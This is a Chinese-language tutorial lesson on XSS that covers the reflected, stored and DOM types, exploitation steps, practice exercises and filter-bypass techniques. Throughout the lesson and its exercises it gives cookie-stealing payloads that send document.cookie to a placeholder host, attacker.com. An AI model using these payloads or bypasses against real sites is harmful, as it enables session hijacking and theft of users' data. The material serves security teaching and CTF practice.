# Day 29：XSS跨站脚本攻击基础——理解与入门

> **学习目标**：理解XSS跨站脚本攻击的原理，掌握XSS的分类和基本利用方法
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. XSS漏洞原理
2. XSS分类
3. 反射型XSS详解
4. 存储型XSS详解
5. DOM型XSS详解
6. 实战练习

---

## 一、XSS漏洞原理

### 1.1 什么是XSS

```
XSS是什么：
  跨站脚本攻击（Cross-Site Scripting）
  攻击者在网页中注入恶意JavaScript代码
  当用户访问网页时，代码被执行
  从而实现攻击目的

原理：
  网站没有对用户输入进行正确的过滤或转义
  导致用户输入的恶意代码被当作脚本执行

危害：
  1. 窃取用户Cookie
  2. 劫持用户会话
  3. 钓鱼攻击
  4. 恶意重定向
  5. 网页篡改
  
示例：
  用户在留言板输入：<script>alert('XSS')</script>
  如果网站没有过滤，这段代码会被执行
```

### 1.2 XSS的条件

```
条件：
  1. 用户输入可以被插入到网页中
  2. 输入内容没有被正确过滤或转义
  3. 浏览器执行了插入的脚本

关键点：
  - 用户可控输入
  - 输入被渲染到页面
  - 脚本被执行

常见场景：
  - 搜索框
  - 留言板
  - 评论区
  - 用户资料页面
```

### 1.3 XSS的影响

```
影响：
  1. 用户层面：
     - Cookie被盗取
     - 会话被劫持
     - 个人信息泄露
  
  2. 网站层面：
     - 网页被篡改
     - 恶意广告注入
     - 钓鱼攻击
  
  3. 服务器层面：
     - 通过XSS进一步攻击服务器
     - 利用XSS获取管理员权限
```

---

## 二、XSS分类

### 2.1 反射型XSS

```
反射型XSS：
  也叫非持久型XSS
  恶意代码通过URL参数传入
  服务器将其反射回页面
  只在当前请求中生效

特点：
  - 一次性攻击
  - 需要用户点击恶意链接
  - 代码不存储在服务器

示例：
  URL：http://example.com/search?q=<script>alert('XSS')</script>
  如果网站没有过滤，页面会执行这段脚本

常见场景：
  - 搜索功能
  - URL参数显示
  - 错误信息显示
```

### 2.2 存储型XSS

```
存储型XSS：
  也叫持久型XSS
  恶意代码被存储在服务器数据库中
  每次用户访问页面都会执行
  危害更大

特点：
  - 持久化攻击
  - 所有访问页面的用户都会受到影响
  - 代码存储在服务器

示例：
  用户在留言板输入：<script>alert('XSS')</script>
  这段代码被存储到数据库
  其他用户查看留言板时会执行这段脚本

常见场景：
  - 留言板
  - 评论区
  - 用户资料
  - 博客文章
```

### 2.3 DOM型XSS

```
DOM型XSS：
  基于DOM的XSS攻击
  恶意代码通过JavaScript操作DOM注入
  服务器不参与，只在客户端执行

特点：
  - 客户端攻击
  - 服务器不知道攻击发生
  - 代码在浏览器中执行

示例：
  页面中有JavaScript代码：
  document.getElementById('content').innerHTML = location.hash.substring(1);
  
  如果URL是：http://example.com/#<script>alert('XSS')</script>
  这段脚本会被执行

常见场景：
  - 使用innerHTML插入内容
  - 使用eval()执行代码
  - 使用document.write()写入内容
```

### 2.4 三种XSS对比

| 类型 | 存储位置 | 攻击方式 | 危害程度 |
|:---|:---|:---|:---:|
| 反射型 | URL参数 | 需要点击链接 | 中 |
| 存储型 | 数据库 | 自动执行 | 高 |
| DOM型 | 客户端 | 客户端执行 | 中 |

---

## 三、反射型XSS详解

### 3.1 反射型XSS原理

```
原理：
  1. 攻击者构造恶意URL
  2. 用户点击URL
  3. 服务器获取URL参数
  4. 服务器将参数内容插入到响应中
  5. 浏览器执行恶意脚本

示例流程：
  1. 攻击者构造URL：
     http://example.com/search?q=<script>alert('XSS')</script>
  
  2. 用户点击链接
  
  3. 服务器处理请求：
     $q = $_GET['q'];
     echo "搜索结果：$q";
  
  4. 响应中包含恶意脚本
  
  5. 浏览器执行脚本，弹出警告框
```

### 3.2 反射型XSS利用方法

```
利用方法：
  1. 找到反射型XSS漏洞点
     - 搜索框、URL参数显示等
  
  2. 构造恶意URL
     - 在参数中插入JavaScript代码
  
  3. 诱骗用户点击链接
     - 通过邮件、消息等方式发送
  
  4. 执行恶意代码
     - 窃取Cookie、劫持会话等

常用Payload：
  - <script>alert('XSS')</script>
  - <script>document.location='http://attacker.com?cookie='+document.cookie</script>
  - <img src=x onerror=alert('XSS')>
```

### 3.3 反射型XSS实战

```
实战步骤：
  1. 找到搜索功能：
     URL：http://example.com/search?q=test
  
  2. 测试XSS漏洞：
     在搜索框输入：<script>alert('XSS')</script>
     如果弹出警告框，说明存在反射型XSS
  
  3. 构造恶意Payload：
     <script>document.location='http://attacker.com/log.php?cookie='+document.cookie</script>
  
  4. 发送给目标用户：
     通过邮件或消息发送恶意链接
  
  5. 用户点击后：
     Cookie被发送到攻击者服务器
```

---

## 四、存储型XSS详解

### 4.1 存储型XSS原理

```
原理：
  1. 攻击者在网站输入恶意代码
  2. 代码被存储到数据库
  3. 用户访问页面时，代码从数据库取出
  4. 代码被渲染到页面
  5. 浏览器执行恶意脚本

示例流程：
  1. 攻击者在留言板输入：
     <script>alert('XSS')</script>
  
  2. 代码被存储到数据库
  
  3. 用户访问留言板页面
  
  4. 服务器从数据库取出留言内容
  
  5. 响应中包含恶意脚本
  
  6. 浏览器执行脚本
```

### 4.2 存储型XSS利用方法

```
利用方法：
  1. 找到存储型XSS漏洞点
     - 留言板、评论区、用户资料等
  
  2. 输入恶意代码
     - 在输入框中插入JavaScript代码
  
  3. 提交内容
     - 代码被存储到数据库
  
  4. 等待其他用户访问
     - 所有访问页面的用户都会执行代码

常用Payload：
  - <script>alert('XSS')</script>
  - <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  - <img src=x onerror=fetch('http://attacker.com/log.php?cookie='+document.cookie)>
```

### 4.3 存储型XSS实战

```
实战步骤：
  1. 找到留言板功能：
     URL：http://example.com/guestbook
  
  2. 测试XSS漏洞：
     在留言框输入：<script>alert('XSS')</script>
     提交后刷新页面，如果弹出警告框，说明存在存储型XSS
  
  3. 构造恶意Payload：
     <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  4. 提交留言：
     代码被存储到数据库
  
  5. 等待其他用户访问：
     所有访问留言板的用户Cookie都会被窃取
```

---

## 五、DOM型XSS详解

### 5.1 DOM型XSS原理

```
原理：
  1. 页面中有JavaScript代码操作DOM
  2. JavaScript从URL或其他来源获取数据
  3. 数据被直接插入到DOM中
  4. 如果数据包含恶意代码，会被执行

示例流程：
  1. 页面中有JavaScript代码：
     var content = location.hash.substring(1);
     document.getElementById('content').innerHTML = content;
  
  2. 攻击者构造URL：
     http://example.com/page.html#<script>alert('XSS')</script>
  
  3. 用户访问URL
  
  4. JavaScript执行，将hash内容插入到DOM
  
  5. 恶意代码被执行
```

### 5.2 DOM型XSS利用方法

```
利用方法：
  1. 分析页面JavaScript代码
     - 找到使用innerHTML、eval、document.write等的地方
  
  2. 确定可控输入源
     - URL参数、hash、localStorage等
  
  3. 构造恶意URL
     - 在可控输入中插入JavaScript代码
  
  4. 诱骗用户访问
     - 用户访问URL时，代码在客户端执行

常用Payload：
  - <script>alert('XSS')</script>
  - <img src=x onerror=alert('XSS')>
  - <svg onload=alert('XSS')>
```

### 5.3 DOM型XSS实战

```
实战步骤：
  1. 分析页面源代码：
     找到JavaScript代码：
     document.getElementById('result').innerHTML = decodeURIComponent(location.search.substring(1));
  
  2. 测试XSS漏洞：
     访问URL：http://example.com/page.html?<script>alert('XSS')</script>
     如果弹出警告框，说明存在DOM型XSS
  
  3. 构造恶意Payload：
     ?<script>document.location='http://attacker.com/log.php?cookie='+document.cookie</script>
  
  4. 发送给目标用户：
     用户访问后，Cookie被窃取
```

---

## 六、实战练习

### 6.1 练习1：反射型XSS

```
题目描述：
  网站有一个搜索功能
  URL：http://example.com/search?q=test
  搜索结果会显示在页面上

解题步骤：
  1. 测试XSS漏洞：
     访问：http://example.com/search?q=<script>alert('XSS')</script>
     如果弹出警告框，说明存在反射型XSS
  
  2. 构造恶意Payload：
     <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  3. 构造完整URL：
     http://example.com/search?q=<script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  4. 发送给目标用户：
     用户点击后，Cookie被发送到攻击者服务器
  
  预期结果：
     获取用户Cookie
```

### 6.2 练习2：存储型XSS

```
题目描述：
  网站有一个留言板功能
  用户可以提交留言，留言会显示在页面上

解题步骤：
  1. 测试XSS漏洞：
     在留言框输入：<script>alert('XSS')</script>
     提交后刷新页面，如果弹出警告框，说明存在存储型XSS
  
  2. 构造恶意Payload：
     <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  3. 提交留言：
     代码被存储到数据库
  
  4. 等待其他用户访问：
     所有访问留言板的用户Cookie都会被窃取
  
  预期结果：
     获取多个用户的Cookie
```

### 6.3 练习3：DOM型XSS

```
题目描述：
  页面中有JavaScript代码：
  document.getElementById('content').innerHTML = location.hash.substring(1);

解题步骤：
  1. 测试XSS漏洞：
     访问：http://example.com/page.html#<script>alert('XSS')</script>
     如果弹出警告框，说明存在DOM型XSS
  
  2. 构造恶意Payload：
     #<script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  3. 构造完整URL：
     http://example.com/page.html#<script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  4. 发送给目标用户：
     用户访问后，Cookie被窃取
  
  预期结果：
     获取用户Cookie
```

---

## 七、常见问题解决

### 7.1 问题1：脚本被过滤

```
现象：
  输入的<script>标签被过滤
  
解决方法：
  1. 使用其他标签：<img>、<svg>、<iframe>等
  2. 使用事件属性：onerror、onload、onclick等
  3. 使用编码绕过：HTML实体编码、URL编码
  4. 使用JavaScript伪协议：javascript:alert('XSS')
  
示例：
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  <iframe src=javascript:alert('XSS')>
```

### 7.2 问题2：引号被过滤

```
现象：
  单引号或双引号被过滤
  
解决方法：
  1. 使用不需要引号的Payload
  2. 使用HTML实体编码引号
  3. 使用反引号（某些浏览器支持）
  
示例：
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
```

### 7.3 问题3：JavaScript被禁用

```
现象：
  用户浏览器禁用了JavaScript
  
解决方法：
  1. 使用其他攻击方式（如钓鱼）
  2. 利用其他漏洞
  3. 无法进行XSS攻击
  
注意：
  XSS攻击依赖JavaScript执行
  如果用户禁用了JavaScript，XSS攻击无法生效
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ XSS漏洞原理
  - 跨站脚本攻击
  - 用户输入未过滤
  
✅ XSS分类
  - 反射型XSS：一次性攻击，需要点击链接
  - 存储型XSS：持久化攻击，所有用户受影响
  - DOM型XSS：客户端攻击，服务器不参与
  
✅ 反射型XSS
  - 原理和利用方法
  - 实战步骤
  
✅ 存储型XSS
  - 原理和利用方法
  - 实战步骤
  
✅ DOM型XSS
  - 原理和利用方法
  - 实战步骤
  
✅ 实战练习
  - 三种XSS类型的实战练习
```

### 8.2 关键记忆点

```
记住这个口诀：

XSS分为三种型，反射存储和DOM；
反射型要点击链接，存储型持久化攻击；
DOM型客户端执行，服务器不知道；
Payload要会写，过滤绕过要掌握！

常用Payload：
  - <script>alert('XSS')</script>
  - <img src=x onerror=alert('XSS')>
  - <svg onload=alert('XSS')>
```

### 8.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录每个题目的解题步骤
  3. 构造恶意Payload

选做题：
  1. 在CTFHub找XSS题目练习
  2. 研究更多XSS Payload
  3. 练习XSS绕过技巧

提交内容：
  - 解题步骤记录
  - Payload代码
  - 总结
```

### 8.4 明日预告

```
Day 30：反射型XSS深入

学习内容：
  - 反射型XSS进阶技巧
  - 绕过方法
  - 实战练习
```

---

**恭喜你完成Day 29的学习！明天学习反射型XSS深入！** 🎉
